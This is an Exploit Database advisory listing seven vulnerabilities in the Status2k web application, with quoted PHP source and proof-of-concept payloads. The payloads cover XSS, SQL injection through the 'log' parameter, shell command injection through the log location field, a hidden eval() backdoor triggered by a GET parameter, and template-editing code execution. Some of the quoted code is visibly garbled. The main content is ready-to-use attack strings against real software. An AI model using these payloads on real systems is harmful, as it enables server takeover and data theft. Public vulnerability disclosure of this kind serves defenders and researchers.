# Exploit Title: Status2k Multiple Vulnerabilities/0days
# Date: 6/20/2014
# Exploit Author: Shayan Sadigh (twitter.com/r1pplex) | <ienjoy.ripples@gmail.com
# Vendor Homepage: http://status2k.com/
# Version: All
# Tested on: Linux/Windows
# CVE : CVE-2014-5088, CVE-2014-5089, CVE-2014-5090, CVE-2014-5091, CVE-2014-5092, CVE-2014-5093, CVE-2014-5094

1. Cross site scripting/XSS... there's tons, example
admin login page, etc

login.php:

if (isset($_GET['username'])) { $useren = $_GET['username']; }
if (isset($_POST['password'])) { $useren = $_POST['username']; }
$q = mysql_query("SELECT * FROM ".$prefix."users");
$adminuser = $res['adminuser']; // Login Database
$cusername = $_COOKIE["S2KUser"];
if ( ($cusername == $adminuser) && ($cpassword == $adminpass) ) { $lgtrue = 1; }
if ( ($useren == $adminuser) && ($passen == $adminpass) ) {
setcookie("S2KUser", $useren);
if ($passen && $useren) {
if ($useren !== $adminuser) { echo '<div class="alert-message error"
                              Username ('.$useren.') Incorrect.</div'; }
        <input type="text" name="username" size="25"

simple injection can be done in the username field, <scriptalert("poc")</script, etc

Use CVE-2014-5088 for all of the XSS issues.

2. SQLi vulnerability in the GET (log)
param... This isn't too useful seeing that if you had auth,
much more damage could be done - refer to command injection
lack of sanitization: in /admin/options/logs.php

$l = $_GET['log'];
  $q = mysql_query("SELECT * FROM ".$prefix."users");
  $query = mysql_query("SELECT * FROM ".$prefix."logs WHERE id = '".$l."'");
  $result = mysql_fetch_array($query) or die(mysql_error());
    $query = mysql_query("SELECT * FROM ".$prefix."logs WHERE id = '".$l."'");
    $result = mysql_fetch_array($query) or die(mysql_error());
    $query = mysql_query("SELECT * FROM ".$prefix."logs WHERE id = '".$l."'");
    $result = mysql_fetch_array($query) or die(mysql_error());

- PoC: site.com/s2kdir/admin/options/logs.php?log=[sqli]

Use CVE-2014-5089.

3. Command injection
This requires access to the Status2k Admin
Panel, log-in and proceed to click the 'Logs' tab, then select
'Add Logs', type in any name and for the 'Location' field use
command injection... Then browse to the created log via the 'Logs'
tab again.

- example: Logs --Add Logs --; then Logs --newly created log

Name: test Location: /var/log/dmesg;pwd; uname -a
localhost/admin/options/addlog.php?type=edit&id=5

so there's no sanitization in addlog.php which lets you put anything
you want as a log location... the issue now is that in logs.php:

$logc = cmdrun($config['logcmd'].$result['location']);
    $log = explode("\n", $logc);
    $log = array_reverse($log);

cmdrun literally calls the equivalent of exec() and thus completely
execution of a command.

if it is complaining about dmesg... try other log locations... such as
/usr/local/apache/logs/suexec_log, also try other bash chars, such as

| & && ; $(), etc

Use CVE-2014-5090.

4. eval() [RCE] backdoor..
For about a year, status2k.com was hosting a backdoored version
of their software... either they knew it or not, there was never an
announcement when the backdoor was found (good job).

in the file /includes/functions.php:
eval($_GET['multies']);

site.com/s2k/includes/functions.php?multies=inject_php_code here

PoC: site.com/s2k/includes/functions.php?multies=echo 'foobar';

Use CVE-2014-5091.

5. Another RCE
status2k also lacks sanitization in the templates; /admin/options/editpl.php

one can literally place any malicious php code they want here and have it execute

// Let's make sure the file exists and is writable first.
if (is_writable("../../templates/".$config['templaten']."/".$filename)) {

    // In our example we're opening $filename in append mode.
    // The file pointer is at the bottom of the file hence
    // that's where $somecontent will go when we fwrite() it.
    if (!$handle = fopen("../../templates/".$config['templaten']."/".$filename, 'w')) {
         echo "Cannot open file (../../templates/".$config['templaten']."/".$filename.")";
         exit;
    }

    // Write $somecontent to our opened file.
    if (fwrite($handle, $value) === FALSE) {
        echo "Cannot write to file (../../templates/".$config['templaten']."/".$filename.")";
        exit;
    } else {
echo "Success, $filename updated!";

once again complete lack of sanitization.

Use CVE-2014-5092.

6. Design flaw by default Status2k does not remove the install
directory (/install/), this may lead to an attacker resetting the
admin credentials and thus logging in and causing further damage
through RCE vectors listed above.

Use CVE-2014-5093.

7. Information leak... it is not shown by default on the index.php
of status2k above version 2, however // PHPINFO ========== //
================== $action = $_GET["action"]; if ($action ==
"phpinfo") { phpinfo(); die(); } allows anyone to view the server's
phpinfo page (localhost/status/index.php?action=phpinfo)

Use CVE-2014-5094.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
